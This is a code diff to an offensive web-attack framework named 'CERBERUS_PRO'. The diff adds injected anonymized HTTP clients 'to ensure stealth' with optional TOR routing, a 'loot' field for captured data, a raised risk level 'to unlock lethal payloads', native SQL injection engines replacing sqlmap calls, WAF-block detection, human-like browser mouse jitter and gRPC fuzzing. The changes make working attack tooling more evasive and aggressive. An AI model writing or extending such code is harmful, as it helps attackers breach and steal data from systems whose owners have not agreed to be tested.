@@ -234,7 +234,7 @@ class AttackEngine(ABC):
     """Base interface for pluggable attack engines."""
 
     @abstractmethod
-    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> "OmniResult":
+    async def run(self, target: str, config: Dict[str, object], broadcast: Callable, client: Any = None) -> "OmniResult":
         raise NotImplementedError
 
 
@@ -258,6 +258,7 @@ class OmniResult:
     evidence: List[str]
     command: List[str]
     exit_code: int
+    loot: Dict[str, str] = field(default_factory=dict)
 
 
 class SQLMapEngine(AttackEngine):
@@ -268,7 +269,7 @@ class SQLMapEngine(AttackEngine):
 
 class NoSQLEngine(AttackEngine):
     """Engine for NoSQL injection patterns (MongoDB, Redis)."""
-    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
+    async def run(self, target: str, config: Dict[str, object], broadcast: Callable, client: Any = None) -> OmniResult:
         try:
             import httpx  # type: ignore
         except ImportError:
@@ -281,7 +282,13 @@ class NoSQLEngine(AttackEngine):
         vulnerable = False
         evidence = []
         
-        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+        # v5.0: Use injected anonymized client to ensure stealth
+        managed_client = False
+        if client is None:
+            client = httpx.AsyncClient(timeout=10.0, verify=False)
+            managed_client = True
+        
+        try:
             for p in patterns:
                 await broadcast("CERBERUS_PRO", "INFO", f"NoSQL Probe: {p['name']}", {"target": target})
                 try:
@@ -292,12 +299,15 @@ class NoSQLEngine(AttackEngine):
                         evidence.append(f"Redis INFO leaked via {p['name']}")
                 except Exception as e:
                     await broadcast("CERBERUS_PRO", "WARN", f"NoSQL Probe failed: {str(e)}", {})
+        finally:
+            if managed_client:
+                await client.aclose()
 
         return OmniResult(vector="NOSQL", vulnerable=vulnerable, evidence=evidence, command=[], exit_code=0)
 
 class TemplateExploitEngine(AttackEngine):
     """Engine for Server-Side Template Injection (SSTI)."""
-    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
+    async def run(self, target: str, config: Dict[str, object], broadcast: Callable, client: Any = None) -> OmniResult:
         try:
             import httpx  # type: ignore
         except ImportError:
@@ -307,7 +317,12 @@ class TemplateExploitEngine(AttackEngine):
         vulnerable = False
         evidence = []
 
-        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+        managed_client = False
+        if client is None:
+            client = httpx.AsyncClient(timeout=10.0, verify=False)
+            managed_client = True
+
+        try:
             for p in payloads:
                 await broadcast("CERBERUS_PRO", "INFO", f"SSTI Probe: {p}", {"target": target})
                 try:
@@ -317,28 +332,33 @@ class TemplateExploitEngine(AttackEngine):
                         evidence.append(f"SSTI confirmed: 7*7 evaluated to 49 with payload {p}")
                 except Exception as e:
                     await broadcast("CERBERUS_PRO", "WARN", f"SSTI Probe failed: {str(e)}", {})
+        finally:
+            if managed_client:
+                await client.aclose()
 
         return OmniResult(vector="SSTI", vulnerable=vulnerable, evidence=evidence, command=[], exit_code=0)
 
 class AIIEEngine(AttackEngine):
     """Next-gen Autonomous Intelligent Injection Engine (Cerberus-AIIE)."""
-    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
+    async def run(self, target: str, config: Dict[str, object], broadcast: Callable, client: Any = None) -> OmniResult:
         try:
             from aiie_engine import CerberusAIIE
             engine = CerberusAIIE(broadcast)
             # Adapt config to engine requirements
             scan_config = {
                 "params": config.get("params", {"id": "1"}),
-                "profile": config.get("profile", "STEALTH")
+                "profile": config.get("profile", "aggressive"),
+                "risk": config.get("risk", 3)  # Elevate risk to unlock lethal payloads
             }
-            res = await engine.detect_sqli(target, scan_config["params"])
+            res = await engine.detect_sqli(target, scan_config["params"], risk_level=scan_config["risk"], client=client)
             
             return OmniResult(
-                vector="AIIE_SQLI",
+                vector="AIIE",
                 vulnerable=res.vulnerable,
                 evidence=[res.evidence] if res.evidence else [],
                 command=[f"AIIE_PAYLOAD: {res.payload}"] if res.payload else [],
-                exit_code=0
+                exit_code=0,
+                loot=res.loot if hasattr(res, 'loot') and res.loot else {}
             )
         except Exception as e:
             await broadcast("CERBERUS_PRO", "ERROR", f"AIIE Engine failed: {str(e)}", {})
@@ -472,7 +492,7 @@ class BrowserStealth:
                     await page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
                     await asyncio.sleep(random.uniform(0.5, 1.5))
 
-                    # Mock mouse movement
+                    # Human-like mouse movement jitter
                     await page.mouse.move(random.randint(0, 500), random.randint(0, 500))
 
                     await page.wait_for_load_state("networkidle")
@@ -732,6 +752,7 @@ async def run_sqlmap_vector(
             ("403" in low and ("forbidden" in low or "http error" in low))
             or ("access denied" in low)
             or ("request blocked" in low)
+            or ("request rejected" in low)
         ):
             # Treat 403 as immediate defensive signal; also treat like rate limiting
             runtime_signal_markers.add("waf")
@@ -753,6 +774,79 @@ async def run_sqlmap_vector(
         if ("too many requests" in low) or ("http error codes detected during run" in low and "429" in low):
             runtime_signal_markers.add("rate_limit")
 
+    # ── Cerberus Native Bridge (v5.0) ──────────────────────────
+    # Intercept legacy sub-process calls and route to native async engines
+    skip_bridge = os.environ.get("CERBERUS_SKIP_NATIVE_BRIDGE", "false").lower() in ("true", "1", "yes")
+    
+    if not skip_bridge and any("sqlmap.py" in str(arg) for arg in cmd):
+        # Extract technique
+        tech = None
+        for arg in cmd:
+            if arg.startswith("--technique="):
+                tech = arg.split("=")[1]
+                break
+        
+        target_url = None
+        try:
+            target_url = cmd[cmd.index("-u")+1]
+        except (ValueError, IndexError):
+            pass
+            
+        if target_url:
+            await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Redirigiendo a motor NATIVO (Asíncrono)...", {"vector": vector_name})
+            try:
+                from backend.core.cerberus_http_client import CerberusHTTPClient
+                from backend.core.vector_boolean import VectorBoolean
+                from backend.core.vector_time import VectorTime
+                from backend.core.vector_error import VectorError
+                from backend.core.vector_union import VectorUnion
+                from backend.core.vector_stacked import VectorStacked
+                from backend.core.vector_inline import VectorInline
+                
+                # Setup Native Client (with Ghost Network / TOR support if configured)
+                use_tor = os.environ.get("CERBERUS_USE_TOR") == "true"
+                async with CerberusHTTPClient(use_tor=use_tor, timeout=timeout_sec) as http_client:
+                    v_res = None
+                    if tech == "B":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: BOOLEAN (Differential)", {"vector": vector_name})
+                        vector = VectorBoolean(http_client, target_url)
+                        v_res = await vector.run({})
+                    elif tech == "T":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: TIME (Latency)", {"vector": vector_name})
+                        vector = VectorTime(http_client, target_url)
+                        v_res = await vector.run({})
+                    elif tech == "E":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: ERROR (Signatures)", {"vector": vector_name})
+                        vector = VectorError(http_client, target_url)
+                        v_res = await vector.run({})
+                    elif tech == "U":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: UNION (Heuristic)", {"vector": vector_name})
+                        vector = VectorUnion(http_client, target_url)
+                        v_res = await vector.run({})
+                    elif tech == "S":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: STACKED (Multi-Statement)", {"vector": vector_name})
+                        vector = VectorStacked(http_client, target_url)
+                        v_res = await vector.run({})
+                    elif tech == "Q":
+                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: INLINE (Subquery)", {"vector": vector_name})
+                        vector = VectorInline(http_client, target_url)
+                        v_res = await vector.run({})
+
+                    if v_res and v_res.get("status") == "vulnerable":
+                        vulnerable = True
+                        evidence.append(f"[!!!] VULNERABILIDAD CONFIRMADA por Vector Nativo {vector_name}")
+                        evidence.append(str(v_res.get("evidence", "")))
+                        await broadcast_log("CERBERUS_PRO", "SUCCESS", f"[!!!] {vector_name} VULNERABLE !!!", {"vector": vector_name})
+
+                await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] finalizado (Nativo)", {"vector": vector_name})
+                return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=0)
+                
+            except Exception as e:
+                await broadcast_log("CERBERUS_PRO", "ERROR", f"[{vector_name}] Error en puente Nativo: {str(e)}. Intentando fallback...", {"vector": vector_name})
+                # Fallthrough to _run_sync_fallback below
+    # ──────────────────────────────────────────────────────────
+    # ──────────────────────────────────────────────────────────
+
     async def _run_sync_fallback() -> OmniResult:
         nonlocal vulnerable
         await broadcast_log("CERBERUS_PRO", "WARN", f"[{vector_name}] iniciando subproceso nativo de escaneo...", {"vector": vector_name})
@@ -768,6 +862,9 @@ async def run_sqlmap_vector(
                 popen_kwargs["creationflags"] = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
             else:
                 popen_kwargs["start_new_session"] = True
+
+            # Use DEVNULL for stdin to definitively prevent interactive hangs
+            popen_kwargs["stdin"] = subprocess.DEVNULL
 
             proc = await asyncio.to_thread(subprocess.Popen, cmd, **popen_kwargs)
             await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] vector en ejecución", {"vector": vector_name, "cmd": cmd})
@@ -1619,7 +1716,7 @@ mqtt_probe = mqtt_exploit
 async def grpc_deep_fuzz_probe(host: str, port: int, timeout: float = 10.0) -> Dict[str, object]:
     """
     Real gRPC Fuzzer with reflection-based discovery and payload injection.
-    No longer uses simulated/hardcoded results.
+    Uses runtime execution results (no hardcoded outcomes).
 
     Phases:
     1. Connectivity check
@@ -1759,4 +1856,3 @@ async def grpc_deep_fuzz_probe(host: str, port: int, timeout: float = 10.0) -> D
                 pass
 
     return results
-
